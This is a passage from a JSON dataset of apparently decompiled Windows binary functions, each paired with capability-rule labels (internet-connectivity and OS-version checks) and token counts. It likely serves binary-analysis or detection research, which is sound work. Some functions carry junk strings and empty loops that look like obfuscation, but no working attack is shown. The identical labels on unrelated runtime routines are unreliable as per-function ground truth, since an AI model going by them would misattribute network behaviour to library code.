        "decompiled_code": "\nfloat10 __cdecl fcn.0040395e(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_40h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4503a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"evfkkqchsccqfoakawcubcyenijuxvtonetggpgvuoqdqtovzjgdqcodqoewzzcuqvgnzcdfqevbjsoexb\");\n    var_10h = 2;\n    fcn.00401e79(0x5497e9);\n    var_10h = 3;\n    fcn.00401e79(\"xlmwvvkqqzpgokhwijwnxgcfalpspzdsfioxamnbklmoio\");\n    for (var_7ch = 0xe; 0 < var_7ch; var_7ch = var_7ch + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return *0x546c44;\n}\n",
        "token_count": 398
    },
    "00403968": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004e14a9)\n\nuint32_t __cdecl fcn.00403968(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar4;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar5;\n    \n    if (*0x57504c != 0) {\n        uVar2 = fcn.00403972(arg_8h, arg_ch, arg_10h, 0);\n        return uVar2;\n    }\n    if ((arg_8h == NULL) || (arg_ch == NULL)) {\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        if (arg_10h < 0x80000000) {\n            if (arg_10h != 0) {\n                do {\n                    uVar4 = *arg_8h;\n                    uVar1 = *arg_ch;\n                    if ((uVar4 == 0) || (uVar1 == 0)) break;\n                    arg_8h = arg_8h + 1;\n                    arg_ch = arg_ch + 1;\n                    if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                        uVar4 = uVar4 + 0x20;\n                    }\n                    if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                        uVar1 = uVar1 + 0x20;\n                    }\n                    bVar5 = uVar4 < uVar1;\n                    if (uVar4 != uVar1) goto code_r0x004e22e1;\n                    arg_10h = arg_10h - 1;\n                } while (arg_10h != 0);\n                arg_10h = 0;\n                bVar5 = uVar4 < uVar1;\n                if (uVar4 != uVar1) {\ncode_r0x004e22e1:\n                    arg_10h = 0xffffffff;\n                    if (!bVar5) {\n                        arg_10h = 1;\n                    }\n                }\n            }\n            return arg_10h;\n        }\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    return 0x7fffffff;\n}\n",
        "token_count": 561
    },
    "0041ebc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ebc0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404d6d();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 97
    },
    "00403972": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403972(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    fcn.004058a8(arg_14h);\n    if (arg_10h == 0) {\n        iVar3 = 0;\n    }\n    else if ((arg_8h == 0) || (arg_ch == 0)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else {\n        iVar3 = 0x7fffffff;\n        if (arg_10h < 0x80000000) {\n            if (*(var_ch + 0xa4) == 0) {\n                iVar3 = fcn.00403661(arg_8h, arg_ch, arg_10h, &var_ch);\n            }\n            else {\n                iVar2 = fcn.004029af(&var_ch, *(var_ch + 0xa4), 0x1001, arg_8h, arg_10h, arg_ch, arg_10h, \n                                     *(var_ch + 0x10));\n                if (iVar2 == 0) {\n                    puVar1 = fcn.00403a35();\n                    *puVar1 = 0x16;\n                }\n                else {\n                    iVar3 = iVar2 + -2;\n                }\n            }\n        }\n        else {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n        }\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return iVar3;\n}\n",
        "token_count": 474
    },
    "004039b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004039b3(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "004039f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.004039f4(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    ushort uVar4;\n    \n    if ((*param_1[7] != 0) && (piVar1 = param_1[0xb],  0 < *piVar1)) {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[7];\n        *param_1[7] = puVar2 + 1;\n        return *puVar2;\n    }\n    pcVar3 = *(*param_1 + 0x1c);\n    (**0x578000)();\n    uVar4 = (*pcVar3)();\n    return uVar4;\n}\n",
        "token_count": 177
    },
    "00403a44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00403a44(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t arg_ch_00;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_3ch;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.00403120(0x30);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    puVar2 = fcn.0040273e(unaff_EBP + -0x3c);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    arg_ch_00 = fcn.00401357();\n    iVar5 = *(unaff_EBP + -0x10);\n    *(unaff_EBP + -0x10) = iVar5;\n    *(iVar5 + 8) = 0;\n    *(iVar5 + 0x10) = 0;\n    *(iVar5 + 0x14) = 0;\n    *(iVar5 + 0x18) = 0;\n    uVar3 = *(arg_ch_00 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401cc1(uVar3, 0, extraout_ECX + 0x2c);\n    *(iVar5 + 8) = uVar3;\n    fcn.00406212(0, arg_ch_00);\n    if (*(iVar5 + 0x28) == '\\0') {\n        cVar1 = *(arg_ch_00 + 0x29);\n    }\n    else {\n        cVar1 = *(arg_ch_00 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(iVar5 + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(iVar5 + 0x1c) = 0;\n    }\n    fcn.00406299(iVar5 + 0x20, *(arg_ch_00 + 0x2b), *(arg_ch_00 + 0x2a), *(arg_ch_00 + 0x2e));\n    fcn.00406299(iVar5 + 0x24, *(arg_ch_00 + 0x2d), *(arg_ch_00 + 0x2c), *(arg_ch_00 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(iVar5 + 0x20) = 0x76782b24;\n        *(iVar5 + 0x24) = 0x76782b24;\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 750
    },
    "00403a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00403a80(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint arg_10h;\n    int32_t iVar6;\n    uint *arg_8h_00;\n    int32_t iVar7;\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_98h;\n    uint var_90h;\n    uint var_88h;\n    uint var_80h;\n    uint var_78h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    char *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    bVar3 = false;\n    do {\n        if ((**0x574458 == '\\0') || (**0x574458 == '@')) break;\n        if ((*0x574464 != '\\0') && (*0x574465 == '\\0')) {\n            return arg_8h;\n        }\n        if (*arg_8h != 0) {\n            var_28h = 0x555750;\n            var_24h = 2;\n            fcn.00402d47(&var_28h);\n            fcn.004053b7(&var_30h, arg_8h);\n            *arg_8h = var_30h;\n            arg_8h[1] = var_2ch;\n            if (bVar3) {\n                piVar5 = fcn.00402eb4(&var_70h, 0x5b, arg_8h);\n                bVar3 = false;\n                *arg_8h = *piVar5;\n                arg_8h[1] = piVar5[1];\n            }\n        }\n        if (**0x574458 == '?') {\n            pcVar1 = *0x574458 + 1;\n            cVar2 = *pcVar1;\n            if (cVar2 == '$') {\n                fcn.0040295a(&var_f0h, 1, 0);\n                arg_8h_00 = &var_50h;\n                goto code_r0x004916e7;\n            }\n            if (cVar2 != '%') {\n                if (cVar2 == '?') {\n                    if (((*0x574458)[2] != '_') || ((*0x574458)[3] != '?')) {\n                        *0x574458 = pcVar1;\n                        arg_10h = fcn.00401d52(&var_c8h);\n                        fcn.00402eb4(&var_d0h, 0x60, arg_10h);\n                        fcn.0040330f(&var_d8h, 0x27);\n                        arg_8h_00 = &var_e0h;\n                        goto code_r0x004916e7;\n                    }\n                    *0x574458 = *0x574458 + 2;\n                    fcn.00402dc4(&var_b8h, 0, 0);\n                    piVar5 = fcn.004053b7(&var_c0h, arg_8h);\n                    *arg_8h = *piVar5;\n                    arg_8h[1] = piVar5[1];\n                    if (**0x574458 == '@') {\ncode_r0x0049161a:\n                        *0x574458 = *0x574458 + 1;\n                    }\n                    goto code_r0x004916fc;\n                }\n                if (cVar2 == 'A') goto code_r0x0049165e;\n                if (cVar2 != 'I') {\n                    if (cVar2 == 'Q') {\n                        *0x574458 = *0x574458 + 2;\n                        var_4h = 0;\n                        var_8h = 0;\n                        do {\n                            iVar4 = var_8h;\n                            fcn.0040295a(&var_20h, 1, 0);\n                            if (var_1ch == '\\0') {\n                                iVar6 = var_1ch;\n                                iVar7 = var_20h;\n                                if (iVar4 != 0) {\n                                    var_18h = var_20h;\n                                    var_14h = var_1ch;\n                                    var_38h = 0x555750;\n                                    var_34h = 2;\n                                    fcn.00405d71(&var_38h);\n                                    piVar5 = fcn.004053b7(&var_88h, &var_8h);\n                                    iVar6 = piVar5[1];\n                                    iVar7 = *piVar5;\n                                }\n                            }\n                            else {\n                                iVar6 = 2;\n                                iVar7 = 0;\n                            }\n                            var_8h = iVar7;\n                            var_4h = iVar6;\n                            if (iVar6 != '\\0') {\n                                arg_8h[1] = 0;\n                                *arg_8h = 0;\n                                *(arg_8h + 1) = 2;\n                                goto code_r0x004916fc;\n                            }\n                        } while (**0x574458 != '@');\n                        fcn.00402eb4(&var_90h, 0x5b, &var_8h);\n                        piVar5 = fcn.0040330f(&var_98h, 0x5d);\n                        *arg_8h = *piVar5;\n                        arg_8h[1] = piVar5[1];\n                        goto code_r0x0049161a;\n                    }\n                    *0x574458 = pcVar1;\n                    fcn.00404c2d(&var_78h);\n                    arg_8h_00 = &var_80h;\n                    goto code_r0x004916e7;\n                }\n                *0x574458 = *0x574458 + 2;\n                fcn.0040295a(&var_a0h, 1, 0);\n                fcn.0040330f(&var_a8h, 0x5d);\n                piVar5 = fcn.004053b7(&var_b0h, arg_8h);\n                bVar3 = true;\n                goto code_r0x004916f0;\n            }\ncode_r0x0049165e:\n            *0x574458 = pcVar1;\n            fcn.00406848(0x574458, 0x40);\n            var_40h = \"`anonymous namespace\\'\";\n            var_3ch = 0x15;\n            fcn.00402d47(&var_40h);\n            fcn.004053b7(&var_10h, arg_8h);\n            *arg_8h = var_10h;\n            arg_8h[1] = var_ch;\n            if (**0x574450 != 9) {\n                fcn.00405803(&var_48h);\n            }\n        }\n        else {\n            fcn.0040295a(&var_58h, 1, 0);\n            arg_8h_00 = &var_60h;\ncode_r0x004916e7:\n            piVar5 = fcn.004053b7(arg_8h_00, arg_8h);\ncode_r0x004916f0:\n            *arg_8h = *piVar5;\n            arg_8h[1] = piVar5[1];\n        }\ncode_r0x004916fc:\n    } while (*(arg_8h + 1) == '\\0');\n    if (**0x574458 == '\\0') {\n        if (*arg_8h == 0) {\n            fcn.00402eb9(1);\n        }\n        else {\n            var_10h = 0x555750;\n            var_ch = 2;\n            fcn.004017df(1);\n            fcn.00405164(&var_58h, &var_10h);\n            piVar5 = fcn.004053b7(&var_50h, arg_8h);\n            *arg_8h = *piVar5;\n            arg_8h[1] = piVar5[1];\n        }\n    }\n    else if (**0x574458 != '@') {\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n    }\n    return arg_8h;\n}\n",
        "token_count": 2082
    },
    "00403a85": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403a85(uint Ptr)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*0x571cc4 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_EncodePointer)(Ptr);\n        *0x571cc4 = *0x571cc4 + -1;\n        *(*0x571cc4 * 4 + 0x5742b0) = uVar2;\n        return;\n    }\n    iVar3 = fcn.00405853();\n    if (iVar3 != 0) {\n        fcn.00405c45(0x16);\n    }\n    if ((*0x571e64 & 2) != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n        if (iVar3 != 0) {\n            pcVar1 = swi(0x29);\n            (*pcVar1)();\n        }\n        fcn.00405a5b(3, 0x40000015, 1);\n    }\n    fcn.004060dc(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 273
    },
    "00403a99": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403a99(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puVar1 = fcn.00405925();\n    var_20h = fcn.00401ee2(*puVar1, puVar1[1], arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (var_20h < 0) {\n        var_20h = -1;\n    }\n    return var_20h;\n}\n",
        "token_count": 177
    },
    "004235c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004235c0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401091();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 94
    },
    "00403ae9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403ae9(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    iVar5 = arg_8h >> 6;\n    iVar4 = (arg_8h & 0x3f) * 0x38;\n    iVar3 = *(iVar5 * 4 + 0x575220);\n    uVar1 = *(iVar3 + 0x28 + iVar4);\n    cVar2 = *(iVar3 + 0x29 + iVar4);\n    if (arg_ch == 0x4000) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 | 0x80;\n        *(*(iVar5 * 4 + 0x575220) + 0x29 + iVar4) = 0;\n    }\n    else if (arg_ch == 0x8000) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 & 0x7f;\n    }\n    else if ((arg_ch == 0x10000) || (arg_ch == 0x20000)) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 | 0x80;\n        *(*(iVar5 * 4 + 0x575220) + 0x29 + iVar4) = 2;\n    }\n    else if (arg_ch == 0x40000) {\n        *(iVar3 + 0x28 + iVar4) = uVar1 | 0x80;\n        *(*(iVar5 * 4 + 0x575220) + 0x29 + iVar4) = 1;\n    }\n    if ((uVar1 & 0x80) == 0) {\n        iVar3 = 0x8000;\n    }\n    else if (cVar2 == '\\0') {\n        iVar3 = 0x4000;\n    }\n    else {\n        iVar3 = ((cVar2 != '\\x01') - 1 & 0x30000) + 0x10000;\n    }\n    return iVar3;\n}\n",
        "token_count": 501
    },
    "00403b1b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403b1b(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4180d0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    for (iStack72 = 0x37; 0 < iStack72; iStack72 = iStack72 + -1) {\n    }\n    for (iStack76 = 0x2c; 0 < iStack76; iStack76 = iStack76 + -1) {\n    }\n    for (iStack80 = 0x2f; 0 < iStack80; iStack80 = iStack80 + -1) {\n    }\n    for (iStack84 = 0x17; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"epevta\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 351
    },
    "00403b2a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403b2a(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff98;\n    uint var_5ch;\n    uint var_58h;\n    uint var_51h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff94;\n    var_10h = 0xffffffff;\n    var_14h = 0x427260;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        iVar1 = fcn.00402513(0x18, in_stack_ffffff98);\n        var_51h._0_1_ = 1;\n        fcn.00406640();\n        var_10h = 0;\n        fcn.00404714();\n        var_10h = 1;\n        fcn.00401ff0(&var_51h + 1, 0, 1);\n        var_51h._0_1_ = 0;\n        *arg_8h = iVar1;\n        fcn.00401fff();\n    }\n    *in_FS_OFFSET = var_18h;\n    return 4;\n}\n",
        "token_count": 334
    },
    "00403b57": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403b57(int32_t param_1)\n\n{\n    if (*(param_1 + 0x404) == 0) {\n        return 0x100;\n    }\n    return *(param_1 + 0x400) >> 2;\n}\n",
        "token_count": 64
    },
    "00403b9d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00403b9d(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    fcn.004058a8(0);\n    uVar2 = 0xfde9;\n    if (*(var_ch + 8) != 0xfde9) {\n        iVar1 = fcn.00404976();\n        uVar2 = 0;\n        if (iVar1 == 0) {\n            uVar2 = 1;\n        }\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar2;\n}\n",
        "token_count": 191
    },
    "00403be3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403be3(code **param_1)\n\n{\n    *param_1 = vtable.std::ctype_unsigned_short_int_.0;\n    if (param_1[4] != NULL) {\n        fcn.00404179(param_1[3]);\n    }\n    fcn.00404179(param_1[5]);\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 96
    },
    "00403c06": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403c06(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar1 = fcn.004063ca(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.00401aaa();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.00404331();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 172
    },
    "00403c47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403c47(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049f946;\n            param_1[7] = 8;\ncode_r0x0049f811:\n            puStack8 = 0x49f816;\n            puVar6 = fcn.00403a35();\n            *puVar6 = 0x16;\n            puStack8 = 0x49f821;\n            uVar7 = fcn.004037ce();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049f811;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049f946;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049f946;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049f946;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049f946;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049f946;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 